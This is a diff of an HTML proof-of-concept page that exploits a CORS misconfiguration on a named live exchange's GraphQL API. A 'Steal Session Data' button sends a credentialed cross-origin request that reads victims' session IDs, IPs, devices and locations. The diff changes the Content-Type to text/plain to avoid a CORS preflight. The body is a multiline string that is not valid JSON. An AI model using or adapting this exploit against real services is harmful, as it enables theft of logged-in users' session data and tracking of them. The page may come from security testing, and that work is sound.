@@ -6,8 +6,8 @@
 </head>
 <body>
 
-<h2>CORS Misconfiguration – GraphQL POST</h2>
-<button id="run">Steal Session Manager Data</button>
+<h2>CORS Misconfiguration – GraphQL POST (No Preflight)</h2>
+<button id="run">Steal Session Data</button>
 <pre id="out">Click the button…</pre>
 
 <script>
@@ -16,15 +16,16 @@ document.getElementById("run").onclick = function () {
   const target = "https://profile.cex.io/account-api/graphql";
   const out = document.getElementById("out");
 
-  out.textContent = "Sending authenticated GraphQL POST request...\n";
+  out.textContent = "Sending POST request WITHOUT preflight...\n";
 
   const xhr = new XMLHttpRequest();
   xhr.open("POST", target, true);
 
-  // 🔥 النقطة الأساسية فـ CORS
+  // 🔥 المهم
   xhr.withCredentials = true;
 
-  xhr.setRequestHeader("Content-Type", "application/json");
+  // ✅ Simple Content-Type → no OPTIONS
+  xhr.setRequestHeader("Content-Type", "text/plain");
 
   xhr.onreadystatechange = function () {
     if (xhr.readyState === 4) {
@@ -35,24 +36,26 @@ document.getElementById("run").onclick = function () {
         "RESPONSE BODY:\n" +
         xhr.responseText;
 
-      console.log("CORS GraphQL PoC response:", xhr.responseText);
+      console.log("CORS PoC response:", xhr.responseText);
     }
   };
 
-  const body = JSON.stringify({
-    query: `
-    {
-        sessionManager {
-            device
-            deviceType
-            ip
-            lastActiveTime
-            sessionId
-            isCurrent
-            location
-        }
-    }`
-  });
+  // GraphQL body عادي
+  const body = `
+{
+  "query": "{
+    sessionManager {
+      device
+      deviceType
+      ip
+      lastActiveTime
+      sessionId
+      isCurrent
+      location
+    }
+  }"
+}
+`;
 
   xhr.send(body);
 };
